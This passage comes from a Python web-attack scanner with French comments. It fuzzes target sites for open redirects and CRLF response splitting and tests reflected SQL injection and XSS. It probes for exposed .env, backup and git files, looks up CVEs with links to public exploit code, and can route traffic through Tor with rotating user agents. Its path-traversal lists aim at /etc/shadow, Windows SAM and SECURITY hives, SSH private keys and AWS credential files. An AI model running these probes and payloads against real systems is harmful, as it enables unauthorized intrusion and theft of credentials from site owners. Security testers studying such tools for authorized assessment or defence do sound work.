            csrf_issues.append(f"Form {action} lacks CSRF protection")
    return csrf_issues


def check_csp(headers):
    csp = headers.get("Content-Security-Policy", "")
    if not csp:
        return ["No CSP defined"]
    return []


def check_server_version(headers):
    server = headers.get("Server", "")
    if server:
        return f"Server version: {server}"
    return "Server version not revealed"


def check_clickjacking_protection(url):
    global proxies
    
    try:
        response = requests.head(url, timeout=10)
        headers = response.headers

        x_frame_options = headers.get("X-Frame-Options", "").lower()
        content_security_policy = headers.get("Content-Security-Policy", "").lower()

        if "deny" in x_frame_options:
            return f"{M}[Secure] {G} {Y}X-Frame-Options is set to 'DENY'."
        elif "sameorigin" in x_frame_options:
            return f"{M}[Secure] {G} {Y}X-Frame-Options is set to 'SAMEORIGIN'."
        elif "frame-ancestors" in content_security_policy:
            return f"{M}[Secure] {G} {Y}CSP includes a 'frame-ancestors' directive."
        else:
            return f"{R}[Vulnerable] {Y}No X-Frame-Options or CSP protections detected."
    except requests.RequestException as e:
        return f"{M}[Error] {R}Error during the check: {e}"


def check_open_redirect(headers, url):
    location = headers.get('Location', None)
    if location and not location.startswith(url):
        return f"Open Redirect detected to {location}."
    return "No open redirects detected."


def analyze_response(resp, final_url):
    try:
        soup = BeautifulSoup(resp.text, 'html.parser')
        report = {
            "redirection": False,
            "meta_redirection": False,
            "javascript_redirection": False
        }

        # Check for HTTP redirects
        if resp.status_code in REDIRECT_CODES:
            report["redirection"] = True
            location = resp.headers.get('Location', 'Unknown')
            print(f"{M}[Info] {G}Header-Based Redirection detected : {location}")

        # Check for missing security headers
        missing_headers = check_headers(resp.headers)
        if missing_headers:
            report["security_headers_issues"] = missing_headers
            print(f"{R}[WARNING] {G}Missing Security Headers : {', '.join(missing_headers)}")

        # Check for <meta> redirection tags
        if check_meta_redirection(soup):
            report["meta_redirection"] = True
            print(f"{M}[Info] {G}Meta Tag Redirection detected")

        # Check for dangerous JavaScript patterns
        dangerous_scripts = check_scripts(soup)
        if dangerous_scripts:
            report["javascript_redirection"] = True
            print(f"{M}[Info] {G}Potentially Dangerous JavaScript Found : {', '.join(dangerous_scripts)}")

        # Check for sources/sinks
        sources_sinks = find_sources_and_sinks(soup)
        if sources_sinks:
            report["sources_sinks"] = sources_sinks
            print(f"{M}[Info] {G}Potentially Vulnerable Source/Sink(s) Found : {', '.join(sources_sinks)}")

        # Check for cookies issues
        cookie_issues = check_cookie_security(resp.headers)
        if cookie_issues:
            report["cookie_issues"] = cookie_issues
            print(f"{M}[Info] {G}Cookie issues : {', '.join(cookie_issues)}")

        # Check for CSRF issues
        csrf_issues = check_csrf_protection(soup)
        if csrf_issues:
            report["csrf_issues"] = csrf_issues
            print(f"{M}[Info] {G}CSRF issues : {', '.join(csrf_issues)}")

        # Check for CSP issues
        csp_issues = check_csp(resp.headers)
        if csp_issues:
            report["csp_issues"] = csp_issues
            print(f"{M}[Info] {G}CSP issues : {', '.join(csp_issues)}")

        # Check server version
        server_version = check_server_version(resp.headers)
        print(f"{M}[Info] {G}Server version : {server_version}")

        # Check for open redirects
        open_redirect_issues = check_open_redirect(resp.headers, final_url)
        print(f"{M}[Info] {G}{open_redirect_issues}")

        return report

    except Exception as e:
        print(f"{M}[ERROR] {R}Error during analysis : {e}")
        return {"error": str(e)}


def audit_page(url, cookies):
    global proxies
    
    try:
        if user_agents == "yes":
            headersX = loadit("payloads/user_agents.txt")
            headers = {
                "User-Agent": random.choice(headersX)
            }        
        else:
            headers = None

        cookies = cookies or {}        
            
        if torusage == "yes":
            proxies = tor_proxies

        response = requests.get(url, proxies=proxies, headers=headers, cookies=cookies)
        print(f"\n{M}[Info] {C}Basic infos report for : {Y}{url}\n----------\n")

        print(f"{M}[+] {G}Searching for click-hijacking vulnerabilities...")
        hijacking = check_clickjacking_protection(url)
        print(hijacking)        
        print("")
        
        print(f"{M}[+] {G}Code review...")
        
        result = analyze_response(response, url)
        
        # Display report
        maxlen = max(len(key) for key in result.keys() if not isinstance(result[key], list))
        for key, value in result.items():
            if not isinstance(value, list):
                spacing = " " * (maxlen - len(key))
                print(f"{M}[{key}]{spacing} {G}--> {Y}{value}")


        print(f"\n{M}[Info] {G}Headers info...")
        # Print all response headers
        version_pattern = re.compile(
            r"("
            r"PHP|ASP\.NET|Apache|nginx|LiteSpeed|IIS|Node\.js|Express|"
            r"Django|Flask|Laravel|Symfony|Spring|Jetty|Tomcat|"
            r"WordPress|Joomla|Drupal|Magento|Shopify|Wix|Squarespace|Prestashop|"
            r"Ubuntu|Debian|CentOS|Red Hat|Fedora|Alpine|Windows|FreeBSD|OpenBSD|"
            r"OpenSSL|LibreSSL|BoringSSL|cURL|wget|"
            r"AWS|Amazon|CloudFront|Cloudflare|Akamai|Fastly|"
            r"Python|Perl|Ruby|Go|Rust|Java|Mono|"
            r"MySQL|PostgreSQL|MariaDB|SQLite|MongoDB|Redis|ElasticSearch|"
            r"React|Angular|Vue\.js|Svelte|jQuery|Next\.js|Nuxt|Ember|Backbone|middleware|"
            r"Webpack|Babel|Grunt|Gulp|Vite|Rollup|"
            r"CVSS|CVE"
            r")[/ ]?[\w\.-]*\d[\w\.-]*",
            re.IGNORECASE
        )

        middleware_headers = {
            "serveurs": ["Server", "X-AspNet-Version", "X-Powered-By", "X-AspNetMvc-Version", "X-Runtime", "X-Python-Version"],
            "cms/frameworks": ["X-Generator", "X-Pingback", "X-Drupal-Cache"],
            "cdn/waf": ["CF-RAY", "CF-Cache-Status", "X-Amz-Cf-Id", "X-Amzn-Trace-Id", "X-Akamai-", "X-Fastly-", "X-CDN", "X-WS-RateLimit-Limit", "X-WS-RateLimit-Remaining"],
            "proxies/load_balancers": ["Via", "X-Forwarded-For", "X-Real-IP", "X-Served-By", "X-Cache", "X-Backend-Server", "X-Proxy-Cache", "x-middleware-subrequest"]
        }

        maxlen = max(len(header) for header in response.headers.keys())

        for header, value in response.headers.items():
            match = version_pattern.search(value)
            is_flagged0 = False
            if match:
                highlighted = value.replace(match.group(), f"{R}{match.group()}{Y}")
                is_flagged0 = True
            else:
                highlighted = value

            is_flagged = False
            for patterns in middleware_headers.values():
                for pattern in patterns:
                    if pattern.lower() in header.lower():
                        is_flagged = True
                        break
                if is_flagged:
                    break

            spacing = " " * (maxlen - len(header))  # alignement
            if is_flagged:
                print(f"{R}[!] {header}{spacing} {G}: {Y}{highlighted}")
            else:
                if is_flagged0:
                    print(f"{R}[!] {G}{header}{spacing} {G}: {Y}{highlighted}")
                else:    
                    print(f"    {G}{header}{spacing} {G}: {Y}{highlighted}")

    except requests.RequestException as e:
        print(f"{M}[Error] {R}Failed to fetch {url}: {e}")


###############################################################################################################
################################################## Redirect ###################################################
###############################################################################################################


def inject_open_redirect(url, payloads):
    parsed_url = urlparse(url)
    original_params = parse_qsl(parsed_url.query)
    injected_urls = []
    
    if not original_params:
        default_params = {
            "url": "//www.google.com",
            "next": "//www.google.com",
            "redirect": "//www.google.com",
            "redir": "//google.com",
            "rurl": "//google.com",
            "redirect_uri": "//google.com"
        }
        for key, payload in default_params.items():
            fuzzed_query = urlencode({key: payload})
            fuzzed_url = urlunparse(
                [parsed_url.scheme, parsed_url.netloc, parsed_url.path, parsed_url.params, fuzzed_query, parsed_url.fragment]
            )
            injected_urls.append(fuzzed_url)
        return injected_urls
    
    
    for payload in payloads:
        for i, (key, value) in enumerate(original_params):
            params_copy = original_params[:]
            params_copy[i] = (key, payload)
            fuzzed_query = urlencode(params_copy)
            fuzzed_url = urlunparse(
                [parsed_url.scheme, parsed_url.netloc, parsed_url.path, parsed_url.params, fuzzed_query, parsed_url.fragment]
            )
            injected_urls.append(fuzzed_url)

    return injected_urls

def test_injected_urls(urls, cookies=None):
    global seen_status_codes, proxies
    cookies = cookies or {}
    
    if torusage == "yes":
        proxies = tor_proxies

    
    
    for url in urls:
        try:
            if user_agents == "yes":
                headersX = loadit("payloads/user_agents.txt")
                headers = {"User-Agent": random.choice(headersX)}
            else:
                headers = None



            response = requests.get(url, headers=headers, proxies=proxies, cookies=cookies, timeout=10, allow_redirects=True)

            parsed_original = urlparse(url)
            parsed_final = urlparse(response.url)

            if parsed_original.netloc != parsed_final.netloc:
                print(f"{G}[Found] {C}{url} - {Y}{response.url}")
            else:
                if verbosity == "yes":
                    print(f"{R}[{response.status_code}]{G} - {url}")
                else:
                    status_code = response.status_code
                    if status_code not in seen_status_codes:
                        seen_status_codes.append(status_code)
                        print(f"{R}[{status_code}] {G}Displayed ...")


        except requests.RequestException as e:
            print(f"{R}[Error]{url} - Exception: {e}")


###############################################################################################################
#################################################### CRLF #####################################################
###############################################################################################################


# Fonction de scan CRLF
def crlfScan(url, payloads, cookies, outputlist):
    for payload in payloads:
        for links in outputlist:
            if verbosity == "yes":
                print(f"{M}[#]{G} {payload}")
            
            if user_agents == "yes":
                headersX = loadit("payloads/user_agents.txt")
                headers = {
                    "User-Agent": random.choice(headersX)
                }        
            else:
                headers = None
                
            testingBreak = request(links, payload, headers, cookies)
            if testingBreak:
                break

def request(url, payload='', headers=None, cookies=None):
    global proxies
    try:
        
        headers = headers or {}
        cookies = cookies or {}

        if payload:
            url = f"{url}{payload}"

        if torusage == "yes":
            proxies = tor_proxies

        response = requests.get(url, headers=headers, proxies=proxies, cookies=cookies, timeout=5)
        return basicChecks(response, url)
    except requests.exceptions.Timeout:
        print(f"{M}[Error] {R}Timeout: {url}")
        return True
    except requests.exceptions.ConnectionError:
        print(f"{M}[Error] {R}Connection Error: {url}")
        return True
    except Exception as e:
        print(f"{M}[Error] {R}Unexpected error: {str(e)}")
        return True

def basicChecks(response, url):
    googles = ["https://www.google.com", "http://www.google.com", "google.com", "www.google.com"]

    if response.status_code in REDIRECT_CODES:
        print(f"{R}[{response.status_code}] {G}{url}")
    if response.status_code in ERROR_CODES:
        print(f"{R}[{response.status_code}] {G}{url}")

    # Vérification des headers
    if response.headers.get('Location') in googles:
        print(f"{R}[Vulnerable] {Y}HTTP Response Splitting detected")
        print(f"{M}[+] {G}Payload : {Y}{payloads[0]} {G}used on {C}{url}")

    if response.headers.get('Set-Cookie') == "name=fucked;":
        print(f"{R}[Vulnerable] {Y}HTTP Response Splitting detected")
        print(f"{M}[+] {G}Payload : {Y}{payloads[0]} {G}used on {C}{url}")


###############################################################################################################
################################################# Vuln_checker ################################################
###############################################################################################################
def wappalyze_that(url, cookies):
# With options
    results = analyze(
        url=url,
        scan_type='balanced',  # 'fast', 'balanced', or 'full'
        threads=3,
        cookie=cookies
    )
    print_technos_detected(results)
    return results
    

def print_technos_detected(technos_dict):
    print(f"{G}[+] Detected technologies (Wappalyzer analysis)")
    for url, technologies in technos_dict.items():
        for tech_name, tech_info in technologies.items():
            version = tech_info.get("version", "") or "N/A"
            confidence = tech_info.get("confidence", 0)
            categories = ", ".join(tech_info.get("categories", []))
            Groups = ", ".join(tech_info.get("groups", []))
            version_display = f"{R}{version}" if version else f"{Y}N/A"
            print(f"    📌 {C}{tech_name}")
            print(f"       {C}↳ {G}Version    : {Y}{version_display}")
            print(f"       {C}↳ {G}Confidence : {Y}{confidence}%")
            print(f"       {C}↳ {G}Categories : {Y}{categories}")
            print(f"       {C}↳ {G}Groups     : {Y}{Groups}")
    print("")


def is_there_a_vuln(versions, url_target):
    def cve_nvd_search(versions):
        wordpress_keywords = [
            "wordpress", "contact form 7", "woocommerce", "yoast seo", "jetpack", "akismet",
            "google tag manager for wordpress", "wpforms", "elementor", "w3 total cache",
            "all in one seo", "google analytics for wordpress", "classic editor",
            "really simple ssl", "wordfence", "tablepress", "updraftplus", "contact form",
            "gravity forms", "revslider", "wp rocket", "bbpress", "buddyPress", "wp super cache",
            "google analytics dashboard for wp", "wp mail smtp", "slider revolution",
            "contact form 7", "wordpress seo", "wpml", "wp job manager"
        ]


        def get_cpe_for_product(product_name, version):
            base_url = "https://services.nvd.nist.gov/rest/json/cves/2.0"
            params = {
                "keywordSearch": product_name,
                "resultsPerPage": 200,
            }
            response = requests.get(base_url, params=params)
            if response.status_code != 200:
                print(f"    {R}[-] API error for {product_name} : {response.status_code}")
                return None

            data = response.json()
            cpes_found = []

            for item in data.get("vulnerabilities", []):
                configurations = item.get("cve", {}).get("configurations", [])
                for config in configurations:
                    nodes = config.get("nodes", [])
                    for node in nodes:
                        cpe_matches = node.get("cpeMatch", [])
                        for cpe_match in cpe_matches:
                            cpe23uri = cpe_match.get("criteria")
                            if cpe23uri and cpe23uri.startswith("cpe:2.3:a:"):
                                cpes_found.append(cpe23uri)

            for cpe in cpes_found:
                parts = cpe.split(":")
                if len(parts) >= 5:
                    vendor = parts[3]
                    product = parts[4]
                    pname = product_name.lower().replace(" ", "")
                    if pname in vendor or pname in product:
                        new_parts = parts[:]
                        new_parts[5] = version
                        for i in range(6, len(new_parts)):
                            new_parts[i] = "*"
                        new_cpe = ":".join(new_parts)
                        return new_cpe

            if cpes_found:
                parts = cpes_found[0].split(":")
                new_parts = parts[:]
                new_parts[5] = version
                for i in range(6, len(new_parts)):
                    new_parts[i] = "*"
                return ":".join(new_parts)

            return None


        def get_cves_for_cpe(cpe):
            base_url = "https://services.nvd.nist.gov/rest/json/cves/2.0"
            params = {
                "cpeName": cpe,
                "resultsPerPage": 200,
            }
            response = requests.get(base_url, params=params)
            if response.status_code != 200:
                print(f"    {R}[-] API error searching CVEs : {response.status_code}")
                return []

            data = response.json()
            cve_list = []
            for item in data.get("vulnerabilities", []):
                cve_id = item.get("cve", {}).get("id")
                description_data = item.get("cve", {}).get("descriptions", [])
                description = ""
                for desc in description_data:
                    if desc.get("lang") == "en":
                        description = desc.get("value")
                        break

                # Extract CVSS severity and score
                severity = "N/A"
                score = "N/A"
                metrics = item.get("cve", {}).get("metrics", {})
                if "cvssMetricV31" in metrics:
                    cvss_data = metrics["cvssMetricV31"][0]["cvssData"]
                    severity = cvss_data.get("baseSeverity", "N/A")
                    score = cvss_data.get("baseScore", "N/A")
                elif "cvssMetricV30" in metrics:
                    cvss_data = metrics["cvssMetricV30"][0]["cvssData"]
                    severity = cvss_data.get("baseSeverity", "N/A")
                    score = cvss_data.get("baseScore", "N/A")
                elif "cvssMetricV2" in metrics:
                    cvss_data = metrics["cvssMetricV2"][0]["cvssData"]
                    severity = cvss_data.get("baseSeverity", "N/A")
                    score = cvss_data.get("baseScore", "N/A")

                # Get exploit references
                references = item.get("cve", {}).get("references", [])
                exploit_urls = [ref["url"] for ref in references if "Exploit" in ref.get("tags", [])]

                cve_list.append((cve_id, description, severity, score, exploit_urls))
            return cve_list



        def fetch_cve_data(cve_id):
            url = f"https://poc-in-github.motikan2010.net/api/v1/?cve_id={cve_id}"
            response = requests.get(url)
            if response.status_code == 200:
                return response.json()
            else:
                print(f"     {R}→ Failed to fetch data for {cve_id} : {response.status_code}{Fore.YELLOW}")
                return None

        def display_cve_data(cve_data):
            if not cve_data or 'pocs' not in cve_data:
                return

            for poc in cve_data['pocs']:
                print(f"     {C}-----")
                print(f"     {C}→ {G}Exploit : {Y}{poc.get('name', 'N/A')}")
                print(f"     {C}→ {G}Stars   : {Y}{poc.get('stargazers_count', '0')}")
                print(f"     {C}→ {G}{poc.get('html_url', 'N/A')}")

        for url, technologies in versions.items():
            for tech_name, tech_data in technologies.items():
                version = tech_data.get("version") if isinstance(tech_data, dict) else None
                if version:
                    print(f"{G}[+] Checking {tech_name} {version}")
                    # Check if tech_name contains any WP keyword (case-insensitive)
                    tech_name_lower = tech_name.lower()
                    wp_detected = any(keyword in tech_name_lower for keyword in wordpress_keywords)
                    if wp_detected:
                        print(f"    {C}>>> {G}Potential WordPress detected try {Y}--wp {G}argument")

                    cpe = get_cpe_for_product(tech_name, version)
                        
                    if cpe:
                        print(f"    {C}[*] {G}CPE found  : {Y}{cpe}")
                        cves = get_cves_for_cpe(cpe)
                        print(f"    {C}[*] {G}CVEs found : {Y}{len(cves)}")
                        for cve_id, desc, severity, score, exploits in cves:
                            print(f"    {R}[!] {C}{cve_id} {R}[{severity} → {score}]")
                            print(f"     {C}→ {Y}{desc[:100]}...")
                            if exploits:
                                for url in exploits:
                                    print(f"     {C}→ {G}NVD Exploit : {Y}{url}")
                            cve_data = fetch_cve_data(cve_id)
                            display_cve_data(cve_data)
                            #time.sleep(1.5)
                            
                            
                    else:
                        print(f"    {M}[-] No CPE found ...")



    def check_headers(url_target):
        WARN_X_FRAME = "[!] X-Frame-Options isn't set to '{}' or 'DENY'"
        WARN_CSP_FRAME_ANCESTORS = "[!] CSP doesn't include a 'frame-ancestors' directive"

        print(f"{G}[+] Checking headers misconfigurations")

        try:
            response = requests.head(url_target, timeout=10, allow_redirects=True)
            headers = response.headers

            x_frame_options = headers.get("X-Frame-Options")
            content_security_policy = headers.get("Content-Security-Policy")


            if x_frame_options is None:
                print(f"    {R}[!] X-Frame-Options header is missing")
            else:
                x_frame_lower = x_frame_options.lower()
                if "deny" not in x_frame_lower and "sameorigin" not in x_frame_lower:
                    print(f"{R}    " + WARN_X_FRAME.format("DENY or SAMEORIGIN"))

            if content_security_policy is None:
                print(f"{R}    [!] Content-Security-Policy header is missing")
            else:
                if "frame-ancestors" not in content_security_policy.lower():
                    print(f"{R}    " + WARN_CSP_FRAME_ANCESTORS)

        except requests.RequestException as e:
            pass
            

    def is_same_domain(url1, url2):
        return urlparse(url1).netloc == urlparse(url2).netloc


    def test_sql_injection_reflected(url_target):
        sql_errors = [
            # MySQL / MariaDB
            "you have an error in your sql syntax",
            "warning: mysql_",
            "mysql_fetch_array()",
            "mysql_fetch_assoc()",
            "mysql_num_rows()",
            "mysqli_fetch_array()",
            "mysqli_fetch_assoc()",
            "call to undefined function mysql_",
            "unknown column",
            "column count doesn't match",
            "duplicate entry",
            "incorrect integer value",
            "truncated incorrect",
            "supplied argument is not a valid mysql",
            "cannot execute queries while other unbuffered queries",
            "commands out of sync",
            "invalid use of group function",

            # PostgreSQL
            "pg_query()",
            "pg_exec()",
            "pg_fetch_array()",
            "pg_fetch_assoc()",
            "pg_num_rows()",
            "unterminated quoted string",
            "syntax error at or near",
            "pg_query(): query failed",
            "invalid input syntax for",
            "fatal: role",
            "fatal: database",
            "permission denied for",
            "relation does not exist",
            "invalid byte sequence for encoding",
            "more than one row returned by a subquery used as an expression",

            # SQLite
            "sqlite3.*exception",
            "sqliteexception",
            "unrecognized token",
            "near \"",
            "no such table",
            "no such column",
            "sqlite error",
            "unterminated string",
            "attempt to write a readonly database",
            "database is locked",

            # Microsoft SQL Server (MSSQL)
            "microsoft odbc sql server driver",
            "sql server native client",
            "mssql_query()",
            "odbc_exec()",
            "incorrect syntax near",
            "unclosed quotation mark after the character string",
            "invalid column name",
            "ambiguous column name",
            "procedure or function expects parameter",
            "must declare the scalar variable",
            "conversion failed when converting",
            "the multi-part identifier could not be bound",
            "object name is invalid",
            "sql error: incorrect syntax",

            # Oracle
            "ora-00933",  # SQL command not properly ended
            "ora-00936",  # missing expression
            "ora-00904",  # invalid identifier
            "ora-01756",  # quoted string not properly terminated
            "ora-00921",  # unexpected end of SQL command
            "ora-06550",  # PL/SQL: syntax error
            "oracle error",
            "pl/sql: statement ignored",
            "invalid relational operator",

            # Génériques / Frameworks / Divers
            "sql syntax error",
            "quoted string not properly terminated",
            "unclosed quotation mark",
            "syntax error",
            "unexpected end of sql command",
            "sqlstate",
            "database error",
            "fatal error",
            "exception while preparing query",
            "error executing query",
            "odbc sql error",
            "query failed",
            "failed to execute query",
            "pdoexception",
            "syntaxerrorexception",
            "java.sql.sqlexception",
            "invalid query",
            "invalid parameter number",
        ]

        base_domain = urlparse(url_target).netloc

        print(f"{G}[+] Searching for reflected parameters and testing basic quote SQL injection")
        try:
            resp = requests.get(url_target, timeout=10)
            soup = BeautifulSoup(resp.text, "html.parser")

            links = soup.find_all("a", href=True)
            already_tested_keys = set()

            for link in links:
                href = urljoin(url_target, link['href'])
                if not is_same_domain(href, url_target):
                    continue  

                parsed = urlparse(href)
                if not parsed.query:
                    continue

                path = parsed.path
                params = parse_qs(parsed.query)

                for param in params:
                    key = (path, param)
                    if key in already_tested_keys:
                        continue  

                    modified_params = params.copy()
                    modified_params[param] = [v + "'" for v in modified_params[param]]

                    new_query = urlencode(modified_params, doseq=True)
                    injected_url = urlunparse(parsed._replace(query=new_query))
                    full_url = urljoin(url_target, injected_url)

                    if not is_same_domain(full_url, url_target):
                        continue  

                    try:
                        r = requests.get(full_url, timeout=10, allow_redirects=True)
                        page_content = r.text.lower()
                        #print(full_url) # Debug mode 
                        if any(err in page_content for err in sql_errors):
                            print(f"{R}    [!] Possible SQLi in param '{param}' (SQL error string detected)")
                            print(f"{C}    [*] {Y}{full_url}")
                            continue

                        already_tested_keys.add(key)

                        for step in r.history + [r]:
                            if step.status_code >= 500:
                                if is_same_domain(step.url, url_target):
                                    print(f"{R}    [!] Server error ({step.status_code}) possible injection or crash in param '{param}'")
                                    print(f"{C}    [*] {Y}{full_url}")
                                    break

                    except requests.RequestException:
                        continue

        except requests.RequestException:
            pass


    def is_potentially_exploitable(payload, html):
        soup = BeautifulSoup(html, "html.parser")

        # Check raw presence
        if payload in html:
            return True, "Reflected raw"

        # Check if appears in script tag
        for script in soup.find_all("script"):
            if payload in script.text:
                return True, "Inside <script>"

        # Check in attributes
        for tag in soup.find_all(True):
            for attr_val in tag.attrs.values():
                if isinstance(attr_val, list):
                    if any(payload in val for val in attr_val):
                        return True, "In attribute list"
                elif payload in str(attr_val):
                    return True, f"In attribute: {tag.name}"

        return False, None


    def test_reflected_xss(url_target):
        xss_payload = "<XSS123>"
        base_domain = urlparse(url_target).netloc

        print(f"{G}[+] Searching for reflected parameters and testing basic XSS injection")

        try:
            resp = requests.get(url_target, timeout=10)
            soup = BeautifulSoup(resp.text, "html.parser")
            links = soup.find_all("a", href=True)
            already_tested_keys = set()

            for link in links:
                href = urljoin(url_target, link['href'])
                if not is_same_domain(href, url_target):
                    continue 

                parsed = urlparse(href)
                if not parsed.query:
                    continue

                path = parsed.path
                params = parse_qs(parsed.query)

                for param in params:
                    key = (path, param)
                    if key in already_tested_keys:
                        continue

                    modified_params = params.copy()
                    modified_params[param] = [xss_payload]
                    new_query = urlencode(modified_params, doseq=True)
                    injected_url = urlunparse(parsed._replace(query=new_query))
                    full_url = urljoin(url_target, injected_url)

                    if not is_same_domain(full_url, url_target):
                        continue  

                    try:
                        r = requests.get(full_url, timeout=10, allow_redirects=True)

                        for step in r.history + [r]:
                            if not is_same_domain(step.url, url_target):
                                continue
                            #print(full_url) # Debug mode 
                            exploitable, context = is_potentially_exploitable(xss_payload, step.text)
                            if exploitable:
                                print(f"{R}    [!] Possible reflected XSS : param '{param}' ({context})")
                                print(f"{C}    [*] {Y}{step.url}")
                                break
                        else:
                            soup_r = BeautifulSoup(r.text, "html.parser")
                            meta = soup_r.find("meta", attrs={"http-equiv": "refresh"})
                            if meta:
                                content = meta.get("content", "")
                                if "url=" in content.lower():
                                    redirect_path = content.split("url=", 1)[-1].strip().strip("'\"")
                                    redirect_url = urljoin(full_url, redirect_path)

                                    if is_same_domain(redirect_url, url_target):
                                        try:
                                            redirected_response = requests.get(redirect_url, timeout=10, allow_redirects=True)
                                            if xss_payload.lower() in redirected_response.text.lower():
                                                print(f"{R}    [!] Possible reflected XSS : param '{param}' (payload reflected after meta redirect)")
                                                print(f"{C}    [*] {Y}{redirect_url}")
                                        except requests.RequestException:
                                            pass

                        already_tested_keys.add(key)

                    except requests.RequestException:
                        continue

        except requests.RequestException:
            pass


    def test_php_backup_files(url_target):
        print(f"{G}[+] Searching for PHP files and testing various backup file suffixes")

        backup_suffixes = [
            "~",
            ".bak",
            ".old",
            ".orig",
            ".save",
            ".php.bak",
            ".php.orig",
            ".php.save",
        ]

        try:
            resp = requests.get(url_target, timeout=10, allow_redirects=False)
            resp.raise_for_status()
            soup = BeautifulSoup(resp.text, "html.parser")
        except requests.RequestException as e:
            return

        php_files = set()
        tags_attrs = {
            "a": "href",
            "link": "href",
            "script": "src",
            "iframe": "src",
            "img": "src",
            "form": "action",
        }

        for tag, attr in tags_attrs.items():
            for element in soup.find_all(tag):
                val = element.get(attr)
                if val and ".php" in val.lower():
                    full_url = urljoin(url_target, val)
                    parsed = urlparse(full_url)
                    url_no_params = parsed._replace(query="", fragment="")

                    if not url_no_params.path.endswith(".php"):
                        continue

                    for suffix in backup_suffixes:
                        new_path = url_no_params.path + suffix

                        backup_url = urlunparse((
                            url_no_params.scheme,
                            url_no_params.netloc,
                            new_path,
                            url_no_params.params,
                            "",
                            ""
                        ))

                        php_files.add(backup_url)

        for backup_url in php_files:
            try:
                r = requests.get(backup_url, timeout=10, allow_redirects=False)
                if r.status_code == 200:
                    print(f"{R}    [!] Backup file accessible")
                    print(f"{C}    [*] {Y}{backup_url}")
            except requests.RequestException:
                pass

    def test_sensitive_files(url_target):
        sensitive_files = [
            ".env",
            "config.php",
            "phpinfo.php",
            ".htaccess",
            ".htpasswd",
            "settings.py",
            "config.json",
            "config.yaml",
            "database.sql",
            "dump.sql",
            "backup.zip",
            "backup.tar.gz",
            "error.log",
            ".git/config",
        ]

        parsed = urlparse(url_target)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        print(f"{G}[+] Testing sensitive files from {base_url}")

        for file_path in sensitive_files:
            url = base_url.rstrip('/') + '/' + file_path
            try:
                resp = requests.get(url, timeout=10, allow_redirects=False)
                if resp.status_code == 200:
                    content_type = resp.headers.get('Content-Type', '')
                    if any(ct in content_type for ct in ['text', 'json', 'xml']):
                        print(f"{R}    [!] Sensitive file accessible")
                        print(f"{C}    [*] {Y}{url}")
                    else:
                        print(f"{R}    [!] Sensitive file (non text) accessible (Content-Type : {content_type})")
                        print(f"{C}    [*] {Y}{url}")

            except requests.RequestException as e:
                pass


    def redirect_test(url_target):
        payload_variants = [
            f"%0ahttps://github.com",
            f"%0dhttps://github.com",
            f"%0d%0ahttps://github.com",
            f"%250ahttps://github.com",
            f"%0a//github.com",
            f"%0a/\\github.com",
            f"%0a//%2Fgithub.com",
            f"//github.com",
            f"%0a%2F%2Fgithub.com",
            f"%0Ahttps://github.com",
        ]
        print(f"{G}[+] Testing open redirect payloads")

        for variant in payload_variants:
            test_url = f"{url_target}/{variant}"
            try:
                response = requests.get(test_url, allow_redirects=False, timeout=10)
                status = response.status_code
                location = response.headers.get('Location', '')
                
                if status in [301, 302, 303, 307, 308] and location:
                    print(f"{C}    [*] {Y}{test_url} {C}→ {G}Location : {location} {R}[{status}]")

            except requests.RequestException as e:
                pass


    cve_nvd_search(versions)
    check_headers(url_target)
    test_sql_injection_reflected(url_target)
    test_reflected_xss(url_target)
    test_php_backup_files(url_target)
    test_sensitive_files(url_target)
    redirect_test(url_target)


###############################################################################################################
################################################ Traversal_enum ###############################################
###############################################################################################################


NON_EXISTENT_PATH = "../../../../../../nonexistent_1237456.txt"

COMMON_PATHS_windows = [
    # Configuration système de base
    "../../../../../../windows/win.ini",                    # Fichier historique toujours présent
    "../../../../../../windows/system.ini",                  # Vieux fichier config Windows
    "../../../../../../windows/system32/drivers/etc/hosts",  # Fichier hosts local
    "../../../../../../windows/system32/drivers/etc/networks",
    "../../../../../../windows/system32/drivers/etc/protocol",
    "../../../../../../windows/system32/drivers/etc/services",

    # SAM et registre (attention, nécessite souvent des privilèges)
    "../../../../../../windows/system32/config/SAM",         # Comptes locaux
    "../../../../../../windows/system32/config/SYSTEM",      # Informations système
    "../../../../../../windows/system32/config/SECURITY",    # Infos de sécurité
    "../../../../../../windows/system32/config/SOFTWARE",    # Logiciels installés
    "../../../../../../windows/system32/config/DEFAULT",     # Paramètres par défaut

    # Journaux d'événements
    "../../../../../../windows/system32/winevt/Logs/System.evtx",
    "../../../../../../windows/system32/winevt/Logs/Security.evtx",
    "../../../../../../windows/system32/winevt/Logs/Application.evtx",

    # Fichiers de configuration IIS (serveur web)
    "../../../../../../inetpub/logs/LogFiles/W3SVC1/u_ex230101.log",  # Exemple log IIS
    "../../../../../../inetpub/wwwroot/web.config",                    # Config du site IIS
    "../../../../../../windows/system32/inetsrv/config/applicationHost.config"  # Config globale IIS
]


COMMON_PATHS_linux = [
    # Fichiers config
    "../.env", "../../.env",
    "../config.php", "../../config.php",
    "../settings.php", "../../settings.php",
    "../wp-config.php", "../../wp-config.php",
    "../configuration.php", "../../configuration.php",
    "../env.php", "../../env.php",

    # Logs
    "../error.log", "../../error.log",
    "../debug.log", "../../debug.log",
    "../laravel.log", "../../laravel.log",

    # Backups
    "../backup.zip", "../../backup.zip",
    "../config.php.bak", "../../config.php.bak",
    "../wp-config.php.old", "../../wp-config.php.old",

    # Credentials
    "../.git/config", "../../.git/config",
    "../.ssh/id_rsa", "../../.ssh/id_rsa",
    "../.aws/credentials", "../../.aws/credentials",

    # CMS
    "../wp-content/debug.log", "../../wp-content/debug.log",
    "../sites/default/settings.php", "../../sites/default/settings.php",
    "../storage/logs/laravel.log", "../../storage/logs/laravel.log",

    # Temp
    "../debug.php", "../../debug.php"
]

COMMON_PATHS_linux1 = [
    # ==============================
    # 1. FICHIERS SYSTÈME CRITIQUES
    # ==============================
    "../../../../../../etc/shadow",                   # Hashs mots de passe (root requis)
    "../../../../../../etc/group",                    # Groupes
    "../../../../../../etc/hostname",                 # Nom de la machine
    "../../../../../../etc/hosts",                    # Résolution locale
    "../../../../../../etc/resolv.conf",              # DNS
    "../../../../../../etc/os-release",               # Infos OS
    "../../../../../../etc/issue",                    # Bannière login

    # ==============================
    # 2. CONFIG RÉSEAU & SERVICES
    # ==============================
    "../../../../../../etc/network/interfaces",       # Interfaces réseau (Debian/Ubuntu)
    "../../../../../../etc/sysctl.conf",              # Paramètres kernel
    "../../../../../../etc/services",                 # Liste des ports/services
    "../../../../../../etc/ssh/sshd_config",          # Config SSH

    # ==============================
    # 3. LOGS SYSTÈME
    # ==============================
